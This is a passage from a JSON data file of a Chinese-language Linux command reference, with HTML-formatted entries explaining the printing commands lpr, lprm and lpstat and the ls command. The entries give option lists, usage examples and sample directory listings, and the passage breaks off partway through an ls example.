        "body": "<h1 id=\"lpr\">lpr</h1>\n<p>将文件发送给指定打印机进行打印</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lpr命令</strong> 用于将文件发送给指定打印机进行打印，如果不指定目标打印机，则使用默认打印机。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lpr</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>E：与打印服务器连接时强制使用加密；\n<span class=\"hljs-literal\">-</span>H：指定可选的打印服务器；\n<span class=\"hljs-literal\">-</span>C：指定打印任务的名称；\n<span class=\"hljs-literal\">-</span>P：指定接受打印任务的目标打印机；\n<span class=\"hljs-literal\">-</span>U：指定可选的用户名；\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">#：指定打印的份数；</span>\n<span class=\"hljs-literal\">-</span>h：关闭banner打印；\n<span class=\"hljs-literal\">-</span>m：打印完成后发送E-mail；\n<span class=\"hljs-literal\">-</span>r：打印完成后删除文件。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需打印的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将man1和man2送到打印机lp进行打印：</p>\n<pre><code class=\"language-shell\">lpr -P lp ma<span class=\"hljs-symbol\">n1</span> ma<span class=\"hljs-symbol\">n2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lprm",
        "des": "删除打印队列中的打印任务",
        "body": "<h1 id=\"lprm\">lprm</h1>\n<p>删除打印队列中的打印任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lprm命令</strong> 用于删除打印队列中的打印任务。尚未完成的打印机任务会被放在打印机贮列之中，这个命令可用来将常未送到打印机的任务取消。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lprm</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：与打印服务器连接时强制使用加密；</span>\n<span class=\"hljs-deletion\">-P：指定接受打印任务的目标打印机；</span>\n<span class=\"hljs-deletion\">-U：指定可选的用户名。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>打印任务：指定需删除的打印任务号。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将打印机hpprint中的第102号任务移除：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lprm</span> -Phpprint <span class=\"hljs-number\">102</span>\n</code></pre>\n<p>将第101号任务由预设打印机中移除：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lprm</span> <span class=\"hljs-number\">101</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lpstat",
        "des": "显示CUPS中打印机的状态信息",
        "body": "<h1 id=\"lpstat\">lpstat</h1>\n<p>显示CUPS中打印机的状态信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lpstat命令</strong> 用于显示CUPS中打印机的状态信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lpstat</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：与打印机连接时加密；</span>\n<span class=\"hljs-deletion\">-R：显示打印任务的等级；</span>\n<span class=\"hljs-deletion\">-U：指定可选用户名；</span>\n<span class=\"hljs-deletion\">-a：显示接受打印任务的打印机；</span>\n<span class=\"hljs-deletion\">-c：显示打印机类；</span>\n<span class=\"hljs-deletion\">-d：显示默认打印机；</span>\n<span class=\"hljs-deletion\">-h：指定可选的服务器信息；</span>\n<span class=\"hljs-deletion\">-l：显示长格式；</span>\n<span class=\"hljs-deletion\">-p：显示指定打印机，以及打印机是否接受打印任务；</span>\n<span class=\"hljs-deletion\">-s：显示汇总信息；</span>\n<span class=\"hljs-deletion\">-t：显示所有的状态信息。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ls",
        "des": "显示目录内容列表",
        "body": "<h1 id=\"ls\">ls</h1>\n<p>显示目录内容列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ls命令</strong> 就是list的缩写，用来显示目标列表，在Linux中是使用率较高的命令。ls命令的输出信息可以进行彩色加亮显示，以分区不同类型的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ls <span class=\"hljs-comment\">[选项]</span> <span class=\"hljs-comment\">[文件名...]</span>\n   <span class=\"hljs-comment\">[-1abcdfgiklmnopqrstuxABCDFGLNQRSUX]</span> <span class=\"hljs-comment\">[-w cols]</span> <span class=\"hljs-comment\">[-T cols]</span> <span class=\"hljs-comment\">[-I pattern]</span> <span class=\"hljs-comment\">[--full-time]</span> \n   <span class=\"hljs-comment\">[--format={long,verbose,commas,across,vertical,single-col‐umn}]</span> \n   <span class=\"hljs-comment\">[--sort={none,time,size,extension}]</span> <span class=\"hljs-comment\">[--time={atime,access,use,ctime,status}]</span> \n   <span class=\"hljs-comment\">[--color<span class=\"hljs-comment\">[={none,auto,always}]</span>]</span> <span class=\"hljs-comment\">[--help]</span> <span class=\"hljs-comment\">[--version]</span> <span class=\"hljs-comment\">[--]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>C     <span class=\"hljs-comment\"># 多列输出，纵向排序。</span>\n<span class=\"hljs-literal\">-</span>F     <span class=\"hljs-comment\"># 每个目录名加 \"/\" 后缀，每个 FIFO 名加 \"|\" 后缀， 每个可运行名加“ * ”后缀。</span>\n<span class=\"hljs-literal\">-</span>R     <span class=\"hljs-comment\"># 递归列出遇到的子目录。</span>\n<span class=\"hljs-literal\">-</span>a     <span class=\"hljs-comment\"># 列出所有文件，包括以 \".\" 开头的隐含文件。</span>\n<span class=\"hljs-literal\">-</span>c     <span class=\"hljs-comment\"># 使用“状态改变时间”代替“文件修改时间”为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。</span>\n<span class=\"hljs-literal\">-</span>d     <span class=\"hljs-comment\"># 将目录名像其它文件一样列出，而不是列出它们的内容。</span>\n<span class=\"hljs-literal\">-</span>i     <span class=\"hljs-comment\"># 输出文件前先输出文件系列号（即 i 节点号: i-node number）。 -l  列出（以单列格式）文件模式</span>\n       <span class=\"hljs-comment\"># （file mode），文件的链接数，所有者名，组名，文件大小（以字节为单位），时间信息，及文件名。</span>\n       <span class=\"hljs-comment\"># 缺省时，时间信息显示最近修改时间；可以以选项“-c”和“-u”选择显示其它两种时间信息。对于设备文件，</span>\n       <span class=\"hljs-comment\"># 原先显示文件大小的区域通常显示的是主要和次要的信号（majorand minor device numbers）。</span>\n<span class=\"hljs-literal\">-</span>q     <span class=\"hljs-comment\"># 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。）</span>\n<span class=\"hljs-literal\">-</span>r     <span class=\"hljs-comment\"># 逆序排列。</span>\n<span class=\"hljs-literal\">-</span>t     <span class=\"hljs-comment\"># 按时间信息排序。</span>\n<span class=\"hljs-literal\">-</span>u     <span class=\"hljs-comment\"># 使用最近访问时间代替最近修改时间为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。</span>\n<span class=\"hljs-literal\">-</span>1     <span class=\"hljs-comment\"># 单列输出。</span>\n<span class=\"hljs-literal\">-</span>1, --format=single-column  <span class=\"hljs-comment\"># 一行输出一个文件（单列输出）。如标准输出不是到终端，此选项就是缺省选项。</span>\n<span class=\"hljs-literal\">-</span>a, --all <span class=\"hljs-comment\"># 列出目录中所有文件，包括以“.”开头的文件。</span>\n<span class=\"hljs-literal\">-</span>b, --escape <span class=\"hljs-comment\"># 把文件名中不可输出的字符用反斜杠加字符编号(就像在 C 语言里一样)的形式列出。</span>\n<span class=\"hljs-literal\">-</span>c, --time=ctime, --time=status\n      <span class=\"hljs-comment\"># 按文件状态改变时间（i节点中的ctime）排序并输出目录内</span>\n      <span class=\"hljs-comment\"># 容。如采用长格式输出（选项“-l”），使用文件的状态改</span>\n      <span class=\"hljs-comment\"># 变时间取代文件修改时间。【译注：所谓文件状态改变（i节</span>\n      <span class=\"hljs-comment\"># 点中以ctime标志），既包括文件被修改，又包括文件属性（ 如所有者、组、链接数等等）的变化】</span>\n<span class=\"hljs-literal\">-</span>d, --directory\n      <span class=\"hljs-comment\"># 将目录名像其它文件一样列出，而不是列出它们的内容。</span>\n<span class=\"hljs-literal\">-</span>f    <span class=\"hljs-comment\"># 不排序目录内容；按它们在磁盘上存储的顺序列出。同时启 动“ -a ”选项，如果在“ -f ”之前存在“ -l”、</span>\n      <span class=\"hljs-comment\"># “ - -color ”或“ -s ”，则禁止它们。</span>\n<span class=\"hljs-literal\">-</span>g    <span class=\"hljs-comment\"># 忽略，为兼容UNIX用。</span>\n<span class=\"hljs-literal\">-</span>i, --inode\n      <span class=\"hljs-comment\"># 在每个文件左边打印  i  节点号（也叫文件序列号和索引号:  file  serial  number and index num‐</span>\n      <span class=\"hljs-comment\"># ber）。i节点号在每个特定的文件系统中是唯一的。</span>\n<span class=\"hljs-literal\">-</span>k, --kilobytes\n      <span class=\"hljs-comment\"># 如列出文件大小，则以千字节KB为单位。</span>\n<span class=\"hljs-literal\">-</span>l, --format=long, --format=verbose\n      <span class=\"hljs-comment\"># 输出的信息从左到右依次包括文件名、文件类型、权限、硬链接数、所有者名、组名、大小（byte）</span>\n      <span class=\"hljs-comment\"># 、及时间信息（如未指明是其它时间即指修改时间）。对于6个月以上的文件或超出未来</span>\n      <span class=\"hljs-comment\"># 1小时的文件，时间信息中的时分将被年代取代。</span>\n      <span class=\"hljs-comment\"># 每个目录列出前，有一行“总块数”显示目录下全部文件所占的磁盘空间。块默认是1024字节；</span>\n      <span class=\"hljs-comment\"># 如果设置了 POSIXLY_CORRECT 的环境变量，除非用“-k”选项，则默认块大小是 512 字节。</span>\n      <span class=\"hljs-comment\"># 每一个硬链接都计入总块数（因此可能重复计数），这无 疑是个缺点。</span>\n\n<span class=\"hljs-comment\"># 列出的权限类似于以符号表示（文件）模式的规范。但是 ls</span>\n      <span class=\"hljs-comment\"># 在每套权限的第三个字符中结合了多位（ multiple bits ） 的信息，如下： s 如果设置了  setuid</span>\n      <span class=\"hljs-comment\"># 位或 setgid   位，而且也设置了相应的可执行位。 S 如果设置了 setuid 位或 setgid</span>\n      <span class=\"hljs-comment\"># 位，但是没有设置相应的可执行位。 t 如果设置了  sticky  位，而且也设置了相应的可执行位。  T</span>\n      <span class=\"hljs-comment\"># 如果设置了 sticky 位，但是没有设置相应的可执行位。              x</span>\n      <span class=\"hljs-comment\"># 如果仅仅设置了可执行位而非以上四种情况。 - 其它情况（即可执行位未设置）。</span>\n<span class=\"hljs-literal\">-</span>m, --format=commas\n      <span class=\"hljs-comment\"># 水平列出文件，每行尽可能多，相互用逗号和一个空格分隔。</span>\n<span class=\"hljs-literal\">-</span>n, --numeric-uid-gid\n      <span class=\"hljs-comment\"># 列出数字化的 UID 和 GID 而不是用户名和组名。</span>\n<span class=\"hljs-literal\">-</span>o    <span class=\"hljs-comment\">#  以长格式列出目录内容，但是不显示组信息。等于使用“         --format=long          --no-group</span>\n      <span class=\"hljs-comment\"># ”选项。提供此选项是为了与其它版本的 ls 兼容。</span>\n<span class=\"hljs-literal\">-</span>p    <span class=\"hljs-comment\">#  在每个文件名后附上一个字符以说明该文件的类型。类似“ -F ”选项但是不 标示可执行文件。</span>\n<span class=\"hljs-literal\">-</span>q, --hide-control-chars\n      <span class=\"hljs-comment\"># 用问号代替文件名中非打印的字符。这是缺省选项。</span>\n<span class=\"hljs-literal\">-</span>r, --reverse\n      <span class=\"hljs-comment\"># 逆序排列目录内容。</span>\n<span class=\"hljs-literal\">-</span>s, --size\n      <span class=\"hljs-comment\"># 在每个文件名左侧输出该文件的大小，以    1024   字节的块为单位。如果设置了   POSIXLY_CORRECT</span>\n      <span class=\"hljs-comment\"># 的环境变量，除非用“ -k ”选项，块大小是 512 字节。</span>\n<span class=\"hljs-literal\">-</span>t, --sort=time\n      <span class=\"hljs-comment\"># 按文件最近修改时间（ i 节点中的 mtime ）而不是按文件名字典序排序，新文件 靠前。</span>\n<span class=\"hljs-literal\">-</span>u, --time=atime, --time=access, --time=use\n      <span class=\"hljs-comment\"># 类似选项“    -t    ”，但是用文件最近访问时间（    i     节点中的     atime     ）取代文件修</span>\n      <span class=\"hljs-comment\"># 改时间。如果使用长格式列出，打印的时间是最近访问时间。</span>\n<span class=\"hljs-literal\">-</span>w, --width cols\n       <span class=\"hljs-comment\"># 假定屏幕宽度是      cols      （      cols     以实际数字取代）列。如未用此选项，缺省值是这</span>\n       <span class=\"hljs-comment\"># 样获得的：如可能先尝试取自终端驱动，否则尝试取自环境变量          COLUMNS          （如果设</span>\n       <span class=\"hljs-comment\"># 置了的话），都不行则取 80 。</span>\n\n<span class=\"hljs-literal\">-</span>x, --format=across, --format=horizontal\n       <span class=\"hljs-comment\"># 多列输出，横向排序。</span>\n\n<span class=\"hljs-literal\">-</span>A, --almost-all\n       <span class=\"hljs-comment\"># 显示除 \".\" 和 \"..\" 外的所有文件。</span>\n\n<span class=\"hljs-literal\">-</span>B, --ignore-backups\n       <span class=\"hljs-comment\"># 不输出以“ ~ ”结尾的备份文件，除非已经在命令行中给出。</span>\n\n<span class=\"hljs-literal\">-</span>C, --format=vertical\n       <span class=\"hljs-comment\"># 多列输出，纵向排序。当标准输出是终端时这是缺省项。使用命令名 dir 和 d 时， 则总是缺省的。</span>\n\n<span class=\"hljs-literal\">-</span>D, --dired\n       <span class=\"hljs-comment\"># 当采用长格式（“-l”选项）输出时，在主要输出后，额外打印一行：  //DIRED//  BEG1 END1 BEG2</span>\n       <span class=\"hljs-comment\"># END2 ...</span>\n\n<span class=\"hljs-comment\"># BEGn 和 ENDn 是无符号整数，记录每个文件名的起始、结束位置在输出中的位置（</span>\n<span class=\"hljs-comment\">#        字节偏移量）。这使得          Emacs          易于找到文件名，即使文件名包含空格或换行等非正</span>\n<span class=\"hljs-comment\">#        常字符也无需特异的搜索。</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># 如果目录是递归列出的（“ -R ”选项），每个子目录后列出类似一行：</span>\n       <span class=\"hljs-comment\"># //SUBDIRED//  BEG1 END1 ...  【译注：我测试了 TurboLinux4.0 和 RedHat6.1 ，发现它们都是在 “</span>\n       <span class=\"hljs-comment\"># //DIRED//     BEG1...     ”之后列出“     //SUBDIRED//     BEG1     ...      ”，也即只有一个</span>\n       <span class=\"hljs-comment\"># 而不是在每个子目录后都有。而且“ //SUBDIRED// BEG1 ... ”列出的是各个子目 录名的偏移。】</span>\n\n<span class=\"hljs-literal\">-</span>F, --classify, --file-type\n       <span class=\"hljs-comment\"># 在每个文件名后附上一个字符以说明该文件的类型。“  * ”表示普通的可执行文件； “ / ”表示目录；“</span>\n       <span class=\"hljs-comment\"># @ ”表示符号链接；“ | ”表示FIFOs；“ = ”表示套接字 (sockets) ；什么也没有则表示普通文件。</span>\n\n<span class=\"hljs-literal\">-</span>G, --no-group\n       <span class=\"hljs-comment\"># 以长格式列目录时不显示组信息。</span>\n\n<span class=\"hljs-literal\">-</span>I, --ignorepattern\n       <span class=\"hljs-comment\"># 除非在命令行中给定，不要列出匹配shell文件名匹配式（pattern ，不是指一般</span>\n       <span class=\"hljs-comment\"># 表达式）的文件。在shell中，文件名以\".\"起始的不与在文件名匹配式(pattern)</span>\n       <span class=\"hljs-comment\"># 开头的通配符匹配。</span>\n\n<span class=\"hljs-literal\">-</span>L, --dereference\n       <span class=\"hljs-comment\"># 列出符号链接指向的文件的信息，而不是符号链接本身。</span>\n\n<span class=\"hljs-literal\">-</span>N, --literal\n       <span class=\"hljs-comment\"># 不要用引号引起文件名。</span>\n\n<span class=\"hljs-literal\">-</span>Q, --quote-name\n       <span class=\"hljs-comment\"># 用双引号引起文件名，非打印字符以 C 语言的方法表示。</span>\n\n<span class=\"hljs-literal\">-</span>R, --recursive\n       <span class=\"hljs-comment\"># 递归列出全部目录的内容。</span>\n\n<span class=\"hljs-literal\">-</span>S, --sort=size\n       <span class=\"hljs-comment\"># 按文件大小而不是字典序排序目录内容，大文件靠前。</span>\n\n<span class=\"hljs-literal\">-</span>T, --tabsize cols\n       <span class=\"hljs-comment\"># 假定每个制表符宽度是 cols 。缺省为 8。为求效率， ls 可能在输出中使用制表符。  若 cols 为</span>\n       0，则不使用制表符。\n\n<span class=\"hljs-literal\">-</span>U, --sort=none\n       <span class=\"hljs-comment\"># 不排序目录内容；按它们在磁盘上存储的顺序列出。（选项“-U”和“-f”的不</span>\n       <span class=\"hljs-comment\"># 同是前者不启动或禁止相关的选项。）这在列很大的目录时特别有用，因为不加排序</span>\n       <span class=\"hljs-comment\"># 能显著地加快速度。</span>\n\n<span class=\"hljs-literal\">-</span>X, --sort=extension\n       <span class=\"hljs-comment\"># 按文件扩展名（由最后的 \".\" 之后的字符组成）的字典序排序。没有扩展名的先列 出。</span>\n\n<span class=\"hljs-literal\">-</span>-color[=when]\n       <span class=\"hljs-comment\"># 指定是否使用颜色区别文件类别。环境变量  LS_COLORS  指定使用的颜色。如何设置 这个变量见 dir‐</span>\n       <span class=\"hljs-comment\"># colors(1) 。 when 可以被省略，或是以下几项之一：</span>\nnone <span class=\"hljs-comment\"># 不使用颜色，这是缺省项。</span>\n       <span class=\"hljs-comment\"># auto 仅当标准输出是终端时使用。 always 总是使用颜色。指定 --color 而且省略 when  时就等同于</span>\n       <span class=\"hljs-comment\"># --color=always 。</span>\n\n<span class=\"hljs-literal\">-</span>-full-time\n       <span class=\"hljs-comment\"># 列出完整的时间，而不是使用标准的缩写。格式如同          date(1)          的缺省格式；此格式</span>\n       <span class=\"hljs-comment\"># 是不能改变的，但是你可以用 cut(1) 取出其中的日期字串并将结果送至命令 “ date -d ”。</span>\n\n<span class=\"hljs-comment\"># 输出的时间包括秒是非常有用的。（ Unix 文件系统储存文件的时间信息精确到秒，</span>\n       <span class=\"hljs-comment\"># 因此这个选项已经给出了系统所知的全部信息。）例如，当你有一个         Makefile          文件</span>\n       <span class=\"hljs-comment\"># 不能恰当地生成文件时，这个选项会提供帮助。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录：指定要显示列表的目录，也可以是具体的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">ls</span>       <span class=\"hljs-comment\"># 仅列出当前目录可见文件</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">ls</span> <span class=\"hljs-literal\">-l</span>    <span class=\"hljs-comment\"># 列出当前目录可见文件详细信息</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">ls</span> <span class=\"hljs-literal\">-hl</span>   <span class=\"hljs-comment\"># 列出详细信息并以可读大小显示文件大小</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">ls</span> <span class=\"hljs-literal\">-al</span>   <span class=\"hljs-comment\"># 列出所有文件（包括隐藏）的详细信息</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">ls</span> -<span class=\"hljs-literal\">-human</span><span class=\"hljs-literal\">-readable</span> -<span class=\"hljs-literal\">-size</span> <span class=\"hljs-literal\">-1</span> <span class=\"hljs-literal\">-S</span> -<span class=\"hljs-literal\">-classify</span> <span class=\"hljs-comment\"># 按文件大小排序</span>\n<span class=\"hljs-variable\">$</span> du <span class=\"hljs-literal\">-sh</span> * | <span class=\"hljs-built_in\">sort</span> <span class=\"hljs-literal\">-h</span> <span class=\"hljs-comment\"># 按文件大小排序(同上)</span>\n</code></pre>\n<p>显示当前目录下包括影藏文件在内的所有文件列表</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -a</span>\n.   anaconda-ks.cfg  <span class=\"hljs-string\">.bash_logout</span>   <span class=\"hljs-string\">.bashrc</span>  install.log         <span class=\"hljs-string\">.mysql_history</span>  satools  <span class=\"hljs-string\">.tcshrc</span>   <span class=\"hljs-string\">.vimrc</span>\n<span class=\"hljs-string\">..</span>  <span class=\"hljs-string\">.bash_history</span>    <span class=\"hljs-string\">.bash_profile</span>  <span class=\"hljs-string\">.cshrc</span>   install.log.syslog  <span class=\"hljs-string\">.rnd</span>            <span class=\"hljs-string\">.ssh</span>     <span class=\"hljs-string\">.viminfo</span>\n</code></pre>\n<p>输出长格式列表</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ls -1</span>\n\nanaconda-ks.cfg\ninstall.<span class=\"hljs-built_in\">log</span>\ninstall.<span class=\"hljs-built_in\">log</span>.syslog\nsatools\n</code></pre>\n<p>显示文件的inode信息</p>\n<p>索引节点（index inode简称为“inode”）是Linux中一个特殊的概念，具有相同的索引节点号的两个文本本质上是同一个文件（除文件名不同外）。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -i -l anaconda-ks.cfg install.log</span>\n2345481 -rw-------<span class=\"hljs-number\"> 1 </span>root root  <span class=\"hljs-number\"> 859 </span>Jun<span class=\"hljs-number\"> 11 </span>22:49 anaconda-ks.cfg\n2345474 -rw-r--r--<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 13837 </span>Jun<span class=\"hljs-number\"> 11 </span>22:49 install.log\n</code></pre>\n<p>水平输出文件列表</p>\n<pre><code class=\"language-shell\">[root@localhost /]# ls -m\n\nbin, boot, data, dev, etc, home, lib, lost+found, media, misc, mnt, opt, <span class=\"hljs-keyword\">proc</span>,<span class=\"hljs-title\"> root,</span> sbin,<span class=\"hljs-title\"> selinux,</span> srv,<span class=\"hljs-title\"> sys,</span> tmp,<span class=\"hljs-title\"> usr,</span> var\n</code></pre>\n<p>修改最后一次编辑的文件</p>\n<p>最近修改的文件显示在最上面。</p>\n<pre><code class=\"language-shell\">[root@localhost /]# ls -t\n\ntmp  root  etc  dev  lib  boot  sys  <span class=\"hljs-keyword\">proc</span><span class=\"hljs-title\">  data</span> <span class=\"hljs-title\"> home</span> <span class=\"hljs-title\"> bin</span> <span class=\"hljs-title\"> sbin</span> <span class=\"hljs-title\"> usr</span> <span class=\"hljs-title\"> var</span> <span class=\"hljs-title\"> lost+found</span> <span class=\"hljs-title\"> media</span> <span class=\"hljs-title\"> mnt</span> <span class=\"hljs-title\"> opt</span> <span class=\"hljs-title\"> selinux</span> <span class=\"hljs-title\"> srv</span> <span class=\"hljs-title\"> misc</span>\n</code></pre>\n<p>显示递归文件</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-keyword\">ls</span> -R\n.:\nanaconda-ks.cfg  install.<span class=\"hljs-keyword\">log</span>  install.<span class=\"hljs-keyword\">log</span>.syslog  satools\n\n./satools:\nblack.txt  freemem.<span class=\"hljs-keyword\">sh</span>  iptables.<span class=\"hljs-keyword\">sh</span>  lnmp.<span class=\"hljs-keyword\">sh</span>  mysql  php502_check.<span class=\"hljs-keyword\">sh</span>  ssh_safe.<span class=\"hljs-keyword\">sh</span>\n</code></pre>\n<p>打印文件的UID和GID</p>\n<pre><code class=\"language-shell\">[root@localhost /]<span class=\"hljs-comment\"># ls -n</span>\n\ntotal 254\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 bin\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1024 </span>Jun<span class=\"hljs-number\"> 15 </span>14:45 boot\ndrwxr-xr-x  <span class=\"hljs-number\"> 6 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 data\ndrwxr-xr-x <span class=\"hljs-number\"> 10 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 3520 </span>Sep<span class=\"hljs-number\"> 26 </span>15:38 dev\ndrwxr-xr-x <span class=\"hljs-number\"> 75 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 16 </span>04:02 etc\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 home\ndrwxr-xr-x <span class=\"hljs-number\"> 14 </span>0<span class=\"hljs-number\"> 0 </span>12288 Jun<span class=\"hljs-number\"> 16 </span>04:02 lib\ndrwx------  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span>16384 Jun<span class=\"hljs-number\"> 11 </span>22:46 lost+found\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>media\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Nov <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 2010 </span>misc\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>mnt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>opt\ndr-xr-xr-x<span class=\"hljs-number\"> 232 </span>0<span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 proc\ndrwxr-x---  <span class=\"hljs-number\"> 4 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 15 </span>14:43 root\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span>12288 Jun<span class=\"hljs-number\"> 12 </span>04:03 sbin\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>selinux\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>srv\ndrwxr-xr-x <span class=\"hljs-number\"> 11 </span>0<span class=\"hljs-number\"> 0 </span>   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 sys\ndrwxrwxrwt  <span class=\"hljs-number\"> 3 </span>0<span class=\"hljs-number\"> 0 </span>98304 Oct<span class=\"hljs-number\"> 16 </span>08:45 tmp\ndrwxr-xr-x <span class=\"hljs-number\"> 13 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 usr\ndrwxr-xr-x <span class=\"hljs-number\"> 19 </span>0<span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 var\n</code></pre>\n<p>列出文件和文件夹的详细信息</p>\n<pre><code class=\"language-shell\">[root@localhost /]<span class=\"hljs-comment\"># ls -l</span>\n\ntotal 254\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 bin\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 1024 </span>Jun<span class=\"hljs-number\"> 15 </span>14:45 boot\ndrwxr-xr-x  <span class=\"hljs-number\"> 6 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 data\ndrwxr-xr-x <span class=\"hljs-number\"> 10 </span>root root <span class=\"hljs-number\"> 3520 </span>Sep<span class=\"hljs-number\"> 26 </span>15:38 dev\ndrwxr-xr-x <span class=\"hljs-number\"> 75 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 16 </span>04:02 etc\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 home\ndrwxr-xr-x <span class=\"hljs-number\"> 14 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 16 </span>04:02 lib\ndrwx------  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 16384 </span>Jun<span class=\"hljs-number\"> 11 </span>22:46 lost+found\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span 